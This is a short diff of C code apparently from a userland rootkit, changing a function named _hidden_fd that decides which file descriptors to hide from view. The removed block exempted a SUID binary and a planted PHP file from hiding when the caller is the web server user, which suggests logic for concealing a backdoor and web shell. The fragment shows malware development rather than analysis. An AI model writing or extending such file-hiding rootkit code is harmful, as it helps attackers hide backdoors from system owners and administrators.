@@ -234,16 +234,6 @@ int _hidden_fd(int fd, short mode){
         ret = 1;
         goto end_hiddenfd;
     }
-    if(iswww()){
-        if(strstr(pathname, SUID_BIN)){
-            ret = 0;
-            goto end_hiddenfd;
-        }
-        if(strstr(pathname, PHP_NEWFILENAME)){
-            ret = 0;
-            goto end_hiddenfd;
-        }
-    }
 
     if(mode == MODE_REG){
         struct stat s_fstat;
